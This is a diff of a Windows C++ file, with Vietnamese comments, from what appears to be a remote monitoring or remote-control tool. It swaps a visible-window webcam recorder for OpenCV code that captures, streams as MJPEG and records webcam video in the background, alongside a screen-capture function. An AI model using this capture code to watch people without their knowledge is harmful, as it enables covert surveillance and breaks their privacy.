@@ -1,3 +1,5 @@
+#include <opencv2/opencv.hpp>
+#include <mutex>
 #include <winsock2.h>
 #include <windows.h>
 #include <vfw.h> 
@@ -7,7 +9,6 @@
 #include <vector>
 #include <iostream>
 
-// ====================== LOGIC SCREENSHOT ======================
 std::string take_screenshot() {
     int x1 = 0; int y1 = 0;
     int x2 = GetSystemMetrics(SM_CXSCREEN);
@@ -63,81 +64,106 @@ std::string take_screenshot() {
     return filename;
 }
 
-// ====================== LOGIC WEBCAM ======================
-void record_webcam_thread_func(std::string filename, int duration_ms) {
-    std::cout << "[Webcam] Dang khoi tao cua so..." << std::endl;
+// ====================== LOGIC WEBCAM  ======================
+cv::Mat latest_frame;
+std::mutex frame_mutex;
+std::atomic<bool> webcam_running(false);
+std::atomic<bool> is_recording(false); // Cờ kiểm soát việc ghi hình
+std::thread webcam_thread;
+std::thread record_thread;
 
-    HWND hWndC = capCreateCaptureWindowA(
-        "Webcam Recorder", 
-        WS_VISIBLE | WS_OVERLAPPEDWINDOW, 
-        100, 100, 320, 240, 
-        NULL, 0
-    );
-
-    if (!hWndC) {
-        std::cerr << "[ERROR] Khong the tao cua so Webcam!" << std::endl;
+// Webcam stream thread
+void webcam_stream_thread() {
+    // Dùng CAP_DSHOW trên Windows để khởi động nhanh hơn và cho phép chỉnh phân giải tốt hơn
+    cv::VideoCapture cap(0, cv::CAP_DSHOW); 
+    
+    if (!cap.isOpened()) {
+        std::cerr << "Error: Cannot open webcam" << std::endl;
         return;
     }
 
-    bool isConnected = false;
+    // Lưu ý: Nếu camera không hỗ trợ, OpenCV sẽ tự chọn độ phân giải gần nhất
+    cap.set(cv::CAP_PROP_FRAME_WIDTH, 1920);
+    cap.set(cv::CAP_PROP_FRAME_HEIGHT, 1080);
+    cap.set(cv::CAP_PROP_FPS, 30);
 
-    // --- VÒNG LẶP QUÉT DRIVER (Từ 0 đến 9) ---
-    for (int driverIndex = 0; driverIndex < 10; driverIndex++) {
-        if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, driverIndex, 0)) {
-            std::cout << "[Webcam] Ket noi THANH CONG voi Driver index: " << driverIndex << std::endl;
-            isConnected = true;
-            break; // Tìm thấy rồi thì thoát vòng lặp
-        }
+    double actual_w = cap.get(cv::CAP_PROP_FRAME_WIDTH);
+    double actual_h = cap.get(cv::CAP_PROP_FRAME_HEIGHT);
+    std::cout << "Camera running at: " << actual_w << "x" << actual_h << std::endl;
+
+    webcam_running = true;
+    cv::Mat frame;
+
+    while (webcam_running) {
+        cap >> frame;
+        if (frame.empty()) continue;
+
+        {
+            std::lock_guard<std::mutex> lock(frame_mutex);
+            latest_frame = frame.clone(); 
+        } 
     }
 
-    if (isConnected) {
-        // Cấu hình Preview
-        SendMessage(hWndC, WM_CAP_SET_SCALE, TRUE, 0);
-        SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 66, 0);
-        SendMessage(hWndC, WM_CAP_SET_PREVIEW, TRUE, 0);
-
-        // Thiết lập file lưu (Dùng đường dẫn tuyệt đối nếu cần)
-        if (SendMessage(hWndC, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)filename.c_str())) {
-             std::cout << "[Webcam] File save location: " << filename << std::endl;
-        }
-
-        CAPTUREPARMS CaptureParms;
-        SendMessage(hWndC, WM_CAP_GET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
-
-        CaptureParms.dwRequestMicroSecPerFrame = (1000000 / 15); // 15 FPS
-        CaptureParms.fYield = TRUE; 
-        CaptureParms.fAbortLeftMouse = FALSE;
-        CaptureParms.fAbortRightMouse = FALSE;
-        CaptureParms.fMakeUserHitOKToCapture = FALSE;
-        CaptureParms.fCaptureAudio = FALSE; 
-        CaptureParms.fLimitEnabled = TRUE;
-        CaptureParms.wTimeLimit = duration_ms / 1000;
-
-        SendMessage(hWndC, WM_CAP_SET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
-
-        std::cout << "[Webcam] Dang quay (" << duration_ms/1000 << "s)..." << std::endl;
-        
-        if (SendMessage(hWndC, WM_CAP_SEQUENCE, 0, 0)) {
-            std::cout << "[Webcam] Xong! File da duoc tao." << std::endl;
-        } else {
-            std::cerr << "[ERROR] Loi trong qua trinh ghi file." << std::endl;
-        }
-
-        SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
-    } 
-    else {
-        // Nếu quét từ 0-9 mà vẫn không được
-        std::cerr << "[CRITICAL ERROR] Khong tim thay bat ky Webcam nao (Index 0-9)!" << std::endl;
-        std::cerr << "Loi khuyen: Kiem tra quyen Privacy hoac Driver." << std::endl;
-    }
-
-    DestroyWindow(hWndC);
+    cap.release();
+    webcam_running = false;
 }
 
-std::string start_webcam_recording(int duration_sec) {
-    std::string filename = "evidence_" + std::to_string(duration_sec) + "s.avi";
+void start_webcam() {
+    if (!webcam_running) {
+        webcam_thread = std::thread(webcam_stream_thread);
+        webcam_thread.detach();
+    }
+}
 
-    record_webcam_thread_func(filename, duration_sec * 1000);
+void stop_webcam() {
+    webcam_running = false;
+    is_recording = false; 
+}
 
-    return "/" + filename;
+// Get latest frame for MJPEG
+bool get_latest_frame(std::vector<uchar>& buffer) {
+    cv::Mat temp_frame;
+    {
+        std::lock_guard<std::mutex> lock(frame_mutex);
+        if (latest_frame.empty()) return false;
+        temp_frame = latest_frame.clone(); // Copy nhanh để giải phóng mutex sớm
+    }
+
+    // TỐI ƯU HÓA: Thiết lập tham số nén JPEG
+    std::vector<int> params;
+    params.push_back(cv::IMWRITE_JPEG_QUALITY);
+    params.push_back(90);
+    
+    // Nếu muốn cực nét nhưng file nặng, dùng 100.
+    // Nếu muốn cân bằng tốc độ/chất lượng, dùng 90.
+
+    cv::imencode(".jpg", temp_frame, buffer, params);
+    return true;
+}
+
+// Record video to AVI
+void record_webcam_thread_func(const std::string& filename, int duration_ms) {
+    cv::VideoCapture cap(0, cv::CAP_DSHOW);
+    if (!cap.isOpened()) return;
+
+    // 1080p
+    int width = 1920;
+    int height = 1080;
+    int fps = 15;
+
+    cv::VideoWriter writer(filename, cv::VideoWriter::fourcc('M','J','P','G'), fps, cv::Size(width, height));
+    if (!writer.isOpened()) return;
+
+    int total_frames = fps * duration_ms / 1000;
+    cv::Mat frame;
+
+    for (int i = 0; i < total_frames; ++i) {
+        cap >> frame;
+        if (frame.empty()) continue;
+        writer.write(frame);
+        cv::waitKey(1000 / fps);
+    }
+
+    writer.release();
+    cap.release();
 }
